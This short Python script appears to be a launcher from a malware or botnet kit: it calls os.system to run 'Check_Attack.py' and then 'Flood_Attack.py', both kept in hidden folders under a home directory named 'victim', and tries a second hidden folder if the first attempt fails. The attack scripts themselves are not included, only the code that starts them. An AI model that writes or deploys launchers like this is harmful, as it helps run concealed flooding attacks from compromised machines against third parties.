import os


def launch_attack():
    try:
        os.system('/usr/bin/python /home/victim/.etc/.module/Check_Attack.py')
    except:
        try:
            os.system('/usr/bin/python /home/victim/.var/.module/Check_Attack.py')
        except:
            print('[ERROR] Check attack failed.')

    try:
        os.system('/usr/bin/python /home/victim/.etc/.module/Flood_Attack.py')
    except:
        try:
            os.system('/usr/bin/python /home/victim/.var/.module/Flood_Attack.py')
        except:
            print('[ERROR] Flood attack failed.')

    return


if __name__ == '__main__':
    launch_attack()
